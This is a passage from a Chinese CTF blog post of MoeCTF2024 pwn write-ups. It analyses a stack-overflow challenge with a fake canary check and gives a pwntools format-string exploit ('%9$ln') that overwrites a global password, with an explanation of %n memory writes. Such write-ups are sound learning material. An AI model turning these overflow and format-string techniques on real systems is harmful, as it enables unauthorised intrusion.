+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v6) == <span class="number">-1</span> || v8 != v6 )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>要求用户输入正确密码，否则无限循环。</li>
+</ul>
+<hr>
+<h3 id="🗝️-第二道锁：cage-in-cage"><a href="#🗝️-第二道锁：cage-in-cage" class="headerlink" title="🗝️ 第二道锁：cage in cage"></a>🗝️ <strong>第二道锁：cage in cage</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%zu&quot;</span>, &amp;v9[i]);</span><br><span class="line">  <span class="keyword">if</span> ( !v9[i] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户可以输入最多两个值（写入 v9[0], v9[1]），输入 <code>0</code>​ 则中断。</li>
+<li>之后进行两次检查：</li>
+</ul>
+<h4 id="🔐-Canary-机制"><a href="#🔐-Canary-机制" class="headerlink" title="🔐 Canary 机制"></a>🔐 Canary 机制</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v10 != <span class="number">195874819</span> )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>v10</code>​ 初始值为 <code>182271573</code>​，若其在执行后被篡改为非 <code>195874819</code>​，说明栈内容被修改（可能是溢出），程序退出。</li>
+<li><strong>这是一个“伪 canary 检查”</strong> ：只要你能控制 <code>v10</code>​ 为 <code>195874819</code>​，你就绕过了检查。</li>
+</ul>
+<h4 id="📦-Cage-检查"><a href="#📦-Cage-检查" class="headerlink" title="📦 Cage 检查"></a>📦 Cage 检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v9[<span class="number">0</span>] != cage_bak )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>验证 <code>v9[0]</code>​ 是否和原先的 <code>cage_bak</code>​ 一致，如果不一致，也会退出。</li>
+</ul>
+<hr>
+<h3 id="💥-漏洞点出现"><a href="#💥-漏洞点出现" class="headerlink" title="💥 漏洞点出现"></a>💥 <strong>漏洞点出现</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x30u</span>LL);</span><br><span class="line"><span class="built_in">puts</span>(buf);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x30u</span>LL);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这里有两个关键点：</p>
+<ol>
+<li><strong>溢出漏洞</strong>：<code>buf</code>​ 是 24 字节，而读入了 0x30（48 字节），存在 <strong>24 字节的栈溢出空间</strong>。</li>
+<li><strong>信息泄露</strong>：<code>puts(buf)</code>​ 会将你输入的内容打印出来，如果你溢出控制到了返回地址附近并构造格式化字符串或 ROP，也许可以泄露 libc。</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h3 id="📌-总结"><a href="#📌-总结" class="headerlink" title="📌 总结"></a>📌 总结</h3><p>该程序的结构如下：</p>
+<ol>
+<li><p><strong>第一道验证</strong>：输入正确的密码（可爆破或通过信息泄露推测）。</p>
+</li>
+<li><p><strong>第二道验证</strong>：</p>
+<ul>
+<li>保持 <code>v10 == 195874819</code>​（绕过canary检查）</li>
+<li>保持 <code>v9[0] == cage_bak</code>​（需要回显或推测计算方式）</li>
+</ul>
+</li>
+<li><p><strong>溢出点</strong>：最后的 <code>read(buf, 0x30)</code>​ 溢出点，可以覆盖返回地址并执行攻击（ROP &#x2F; shellcode 等）。</p>
+</li>
+</ol>
+<hr>
+<h3 id="🛠️-你可以做什么："><a href="#🛠️-你可以做什么：" class="headerlink" title="🛠️ 你可以做什么："></a>🛠️ 你可以做什么：</h3><ul>
+<li>利用 <code>puts(buf)</code>​ 泄露 libc 地址。</li>
+<li>在第二次 <code>read</code>​ 时进行栈溢出，执行攻击。</li>
+<li>关键是绕过 <code>v10</code>​ 和 <code>v9[0]</code>​ 的两个检查点。</li>
+</ul>
+<h1 id="题目：LoginSystem​"><a href="#题目：LoginSystem​" class="headerlink" title="题目：LoginSystem​"></a>题目：<code>LoginSystem</code>​</h1><p><code>一个简单的登陆系统，但是为什么要输出用户名？</code>​</p>
+<p>咱们直接看关键函数</p>
+<p><img src="/./../images/Snipaste_2025-04-18_17-37-24-20250418173741-6g0w9v9.png" alt="Snipaste_2025-04-18_17-37-24"></p>
+<p>两次read()，都无法溢出，连 rbp 都碰不到，连栈迁移都别想，但可以格式化字符串，还有system(&#x2F;bin&#x2F;sh)存在，。看看程序保护？</p>
+<p><img src="/./../images/Snipaste_2025-04-18_19-16-15-20250418191633-pobegdp.png" alt="Snipaste_2025-04-18_19-16-15"></p>
+<p>栈溢出不现实，还是选择利用格式化字符串泄露 password 的值，当然也可以利用%n，修改 password 的值，那然我们看看password 。</p>
+<p><img src="/./../images/Snipaste_2025-04-18_21-51-35-20250418215149-vjtspjr.png" alt="Snipaste_2025-04-18_21-51-35"></p>
+<p>password位于.bss 段上，不在栈上，属于全局变量。</p>
+<p><img src="/./../images/Snipaste_2025-04-18_21-56-51-20250418220104-q1lsunl.png" alt="Snipaste_2025-04-18_21-56-51"></p>
+<p>利用%p，泄露栈上参数的数据，我们读入数据到 buf ，则buf是第8个参数，我们想要写入 password ，就要将 password 的地址写在后面，写入第9个参数，然后修改第9个参数的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">#io = remote(&quot;192.168.75.1&quot;, 52470)</span><br><span class="line">password = 0x404050</span><br><span class="line">payload = b&quot;%9$ln&quot;.ljust(8, b&#x27;\x00&#x27;) + p64(password)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendlineafter(&quot;username:&quot;, payload)</span><br><span class="line">io.sendlineafter(&quot;password:&quot;, b&#x27;\x00&#x27;*8)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>通过栈上格式化字符串漏洞覆盖password全局变量，板子题。要注意的是格式化字符串应该在前面，而地址应该在后面，不然格式化字符串会被\x00截断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;%9$ln&quot;.ljust(8, b&#x27;\x00&#x27;) + p64(password)</span><br></pre></td></tr></table></figure>
+
+<p>将%9$ln补充为8字节，将第8个参数占满（在x86-64的架构中，一个参数占8个字节），后面的 password 的地址，只能进入第9个参数的位置，然后我们在向第9个参数的值（是一个地址），所指的地址里写入 0 。</p>
+<p><img src="/./../images/Snipaste_2025-04-18_22-30-00-20250418223019-x3g63bo.png" alt="Snipaste_2025-04-18_22-30-00"></p>
+<h2 id="讲解：printf-Hello-8-n-​"><a href="#讲解：printf-Hello-8-n-​" class="headerlink" title="讲解：printf(&quot;Hello%8$n&quot;)​"></a>讲解：<code>printf(&quot;Hello%8$n&quot;)</code>​</h2><h3 id="1-基本解释"><a href="#1-基本解释" class="headerlink" title="1. 基本解释"></a><strong>1. 基本解释</strong></h3><ul>
+<li><code>%n</code>​ 的作用是 <strong>将已输出的字符数写入指定地址</strong>（需要一个指针参数）。</li>
+<li><code>%8$n</code>​ 中的 <code>8$</code>​ 表示 <strong>直接访问第8个参数</strong>（而不是按顺序使用下一个参数）。</li>
+</ul>
+<p>所以，<code>printf(&quot;Hello%8$n&quot;)</code>​ 的意思是：</p>
+<ul>
+<li>输出 <code>&quot;Hello&quot;</code>​（5个字符）</li>
+<li>然后使用 <code>%8$n</code>​ <strong>尝试将数字</strong> <strong>​<code>5</code>​</strong>​ <strong>写入栈上第8个参数指向的地址</strong>。</li>
+</ul>
+<hr>
+<h3 id="2-为什么这样写是危险的？"><a href="#2-为什么这样写是危险的？" class="headerlink" title="2. 为什么这样写是危险的？"></a><strong>2. 为什么这样写是危险的？</strong></h3><h4 id="（1）缺少参数"><a href="#（1）缺少参数" class="headerlink" title="（1）缺少参数"></a><strong>（1）缺少参数</strong></h4><p><code>printf(&quot;Hello%8$n&quot;)</code>​ 只提供了格式化字符串，但没有提供额外的参数（如 <code>%n</code>​ 需要的指针地址）。<br>此时，<code>printf</code>​ 会 <strong>直接从栈上读取第8个参数的位置</strong>，并尝试将其作为指针写入 <code>5</code>​（”Hello”的长度）。</p>
+<h4 id="（2）可能导致崩溃或任意内存写入"><a href="#（2）可能导致崩溃或任意内存写入" class="headerlink" title="（2）可能导致崩溃或任意内存写入"></a><strong>（2）可能导致崩溃或任意内存写入</strong></h4><ul>
+<li>如果栈上第8个位置恰好是一个可写的内存地址，<code>%8$n</code>​ 会向该地址写入 <code>5</code>​，可能导致 <strong>数据篡改</strong>。</li>
+<li>如果第8个位置是无效地址（如 <code>NULL</code>​ 或不可写内存），程序会 <strong>崩溃（Segmentation Fault）</strong> 。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Icyice</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">http://example.com/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Icyice's site</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN-CTF-WP/">PWN,CTF,WP</a></div><div class="post-share"><div class="social-share" data-image="/img/OIO.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width no-desc" href="/2025/04/19/1/" title=""><img class="cover" src="/img/OIO.jpg" onerror="onerror=null;src='/img/loading.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2"></div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/loading.gif'" alt="avatar"/></div><div class="author-info-name">Icyice</div><div class="author-info-description">我的野心是一生自由</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Icyice001"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Icyice001" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站，这里会分享一些我学习 PWN 的心得与笔记。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9ANotEnoughTime%E2%80%8B"><span class="toc-number">1.</span> <span class="toc-text">题目：NotEnoughTime​</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%E2%80%8B%EF%BC%9A"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">题解​：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E5%8A%9F%E8%83%BD%E8%A7%A3%E6%9E%90"><span class="toc-number">1.0.1.</span> <span class="toc-text">脚本功能解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E8%AF%B4%E6%98%8E"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">技术细节说明</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-eval-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.2.</span> <span class="toc-text">Python eval() 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.0.3.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">1.0.4.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">1.0.5.</span> <span class="toc-text">参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="toc-number">1.0.6.</span> <span class="toc-text">返回值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.0.7.</span> <span class="toc-text">实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B-1"><span class="toc-number">1.0.8.</span> <span class="toc-text">实例 1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B-2"><span class="toc-number">1.1.</span> <span class="toc-text">实例 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%A6%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">执行简单的数学表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%8F%98%E9%87%8F%E5%BC%95%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">执行变量引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E6%8C%87%E5%AE%9A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%AD%E6%89%A7%E8%A1%8C%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">在指定命名空间中执行表达式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aez-shellcode%E2%80%8B"><span class="toc-number">2.</span> <span class="toc-text">题目：ez_shellcode​</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Aleak-sth%E2%80%8B"><span class="toc-number">3.</span> <span class="toc-text">题目：leak_sth​</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90"><span class="toc-number">3.0.1.</span> <span class="toc-text">1. 函数栈帧分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E2%80%8Bprintf-buf-%E2%80%8B-%E2%80%8B-%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E6%A0%88%E7%8A%B6%E6%80%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">2.  ​printf(buf)​ ​ 调用时的栈状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A1%AE%E5%AE%9A-%E2%80%8Bv3%E2%80%8B%E2%80%8B-%E6%98%AF%E7%AC%AC%E5%87%A0%E4%B8%AA%E5%8F%82%E6%95%B0"><span class="toc-number">3.0.3.</span> <span class="toc-text">3.  确定 ​v3​​ 是第几个参数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F32-bit%EF%BC%81%E2%80%8B"><span class="toc-number">4.</span> <span class="toc-text">题目：这是什么？32-bit！​</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#execve-%E2%80%8B-%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.0.1.</span> <span class="toc-text">execve()​ 函数详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="toc-number">4.0.1.1.</span> <span class="toc-text">函数原型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E"><span class="toc-number">4.0.1.2.</span> <span class="toc-text">参数说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%80%BC-1"><span class="toc-number">4.0.1.3.</span> <span class="toc-text">返回值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E2%80%8Bpayload-flat-%E2%80%8B-%E2%80%8B"><span class="toc-number">4.0.2.</span> <span class="toc-text">1.​payload +&#x3D; flat([ ... ])​ ​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E2%80%8Be-search-b-bin-sh-%E2%80%8B-%E2%80%8B-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.0.3.</span> <span class="toc-text">2.  ​e.search(b&#39;&#x2F;bin&#x2F;sh&#39;)​ ​ 的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E2%80%8Bnext-%E2%80%8B-%E2%80%8B-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.0.4.</span> <span class="toc-text">3.  ​next()​ ​ 的作用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FGOT%EF%BC%81%E2%80%8B"><span class="toc-number">5.</span> <span class="toc-text">题目：这是什么？GOT！​</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Partial-RELRO-RELocation-Read-Only-%E8%AF%A6%E8%A7%A3"><span class="toc-number">6.</span> <span class="toc-text">Partial RELRO (RELocation Read-Only) 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%89%B9%E7%82%B9"><span class="toc-number">6.1.</span> <span class="toc-text">核心特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8E-Full-RELRO-%E5%AF%B9%E6%AF%94"><span class="toc-number">6.2.</span> <span class="toc-text">与 Full RELRO 对比</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%97%AE%E9%97%AEDeepseek%EF%BC%8C%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B-off-404000%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">问问Deepseek，了解一下 off_404000：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AC%A6%E5%8F%B7-%E2%80%8Boff-404000%E2%80%8B%E2%80%8B-%E7%9A%84%E5%90%AB%E4%B9%89"><span class="toc-number">7.0.1.</span> <span class="toc-text">1. 符号 ​off_404000​​ 的含义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E2%80%8B-off-404000%E2%80%8B%E2%80%8B-%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-number">7.0.2.</span> <span class="toc-text">2.   ​&amp;off_404000​​ 的解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%93%E5%90%88%E9%A2%98%E7%9B%AE%E4%BB%A3%E7%A0%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">7.0.3.</span> <span class="toc-text">3. 结合题目代码的漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-GOT-%E8%A1%A8%E7%BB%93%E6%9E%84%E7%A4%BA%E6%84%8F%E5%9B%BE"><span class="toc-number">7.0.4.</span> <span class="toc-text">4. GOT 表结构示意图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E6%98%AF%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">7.0.5.</span> <span class="toc-text">5. 为什么这是关键漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%94%BB%E5%87%BB-Payload-%E7%A4%BA%E4%BE%8B"><span class="toc-number">7.0.6.</span> <span class="toc-text">6. 攻击 Payload 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.0.7.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%92%E9%87%8D%E7%82%B9%EF%BC%9A"><span class="toc-number">7.1.</span> <span class="toc-text">划重点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-PLT-%E8%B7%B3%E8%BD%AC%E5%9C%B0%E5%9D%80%E9%80%89%E6%8B%A9%E9%97%AE%E9%A2%98%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">7.2.</span> <span class="toc-text">关于 PLT 跳转地址选择问题的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PLT-%E6%9D%A1%E7%9B%AE%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90"><span class="toc-number">7.2.1.</span> <span class="toc-text">PLT 条目结构解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%8C%BA%E5%88%AB"><span class="toc-number">7.2.2.</span> <span class="toc-text">关键区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%83%BD%E6%88%90%E5%8A%9F%EF%BC%9F"><span class="toc-number">7.2.3.</span> <span class="toc-text">为什么第二个能成功？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">7.2.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9Frandom%EF%BC%81%E2%80%8B"><span class="toc-number">8.</span> <span class="toc-text">题目：这是什么？random！​</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A2-%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%BE%AA%E7%8E%AF%E7%8C%9C%E6%95%B0%E5%AD%97"><span class="toc-number">8.0.1.</span> <span class="toc-text">🔢 第一阶段：循环猜数字</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dq-0Ah%E2%80%8B-%E7%9A%84%E5%90%AB%E4%B9%89"><span class="toc-number">8.0.1.1.</span> <span class="toc-text">dq 0Ah​ 的含义</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%90-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A-dev-random%E2%80%8B"><span class="toc-number">8.0.2.</span> <span class="toc-text">🔐 第二阶段：&#x2F;dev&#x2F;random​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8C%80-%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5%EF%BC%9Aarc4random%E2%80%8B"><span class="toc-number">8.0.3.</span> <span class="toc-text">🌀 第三阶段：arc4random​</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%9C%80%E5%90%8E%EF%BC%9Aflag-%E4%BB%8D%E7%84%B6%E7%BB%99%E4%BD%A0%EF%BC%81"><span class="toc-number">8.0.4.</span> <span class="toc-text">✅ 最后：flag 仍然给你！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E6%80%BB%E7%BB%93%EF%BC%9A%E5%88%A9%E7%94%A8%E7%AD%96%E7%95%A5"><span class="toc-number">8.0.5.</span> <span class="toc-text">💡 总结：利用策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E6%A0%B8%E5%BF%83%E7%BB%86%E8%8A%82%EF%BC%9A%E7%A7%8D%E5%AD%90%E8%AE%BE%E7%BD%AE"><span class="toc-number">8.0.6.</span> <span class="toc-text">💡 核心细节：种子设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E7%8C%9C%E6%95%B0%E5%AD%97%E6%A0%B8%E5%BF%83%E9%80%BB%E8%BE%91"><span class="toc-number">8.0.7.</span> <span class="toc-text">🎯 猜数字核心逻辑</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9Fshellcode%EF%BC%81%E2%80%8B"><span class="toc-number">9.</span> <span class="toc-text">题目：这是什么？shellcode！​</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9ACatch-the-canary-%E2%80%8B"><span class="toc-number">10.</span> <span class="toc-text">题目：Catch_the_canary!​</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E5%88%B0%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">10.0.0.0.1.</span> <span class="toc-text">来到第一关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E5%88%B0%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">10.0.0.0.2.</span> <span class="toc-text">来到第二关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E5%88%B0%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">10.0.0.0.3.</span> <span class="toc-text">来到第三关</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%9C%85-scanf-%E8%BE%93%E5%85%A5-%E2%80%8B-%E6%88%96-%E2%80%8B-%E7%9A%84%E7%BB%95%E8%BF%87%E7%89%B9%E6%80%A7"><span class="toc-number">10.0.0.0.4.</span> <span class="toc-text">✅ scanf 输入 +​ 或 -​ 的绕过特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E5%88%B0%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">10.0.0.0.5.</span> <span class="toc-text">来到第四关</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E6%9C%80%E5%90%8E%EF%BC%8C%E8%BF%98%E6%9C%89%E4%B8%80%E7%82%B9%E8%A6%81%E6%8F%90%E5%87%BA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E7%9A%84%E3%80%82"><span class="toc-number">10.0.0.1.</span> <span class="toc-text">最后的最后，还有一点要提出来学习的。</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E2%80%8Bcyclic%E2%80%8B%E2%80%8B-%E7%9A%84%E9%BB%98%E8%AE%A4%E8%A1%8C%E4%B8%BA"><span class="toc-number">10.0.1.</span> <span class="toc-text">1.  ​cyclic​​ 的默认行为</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 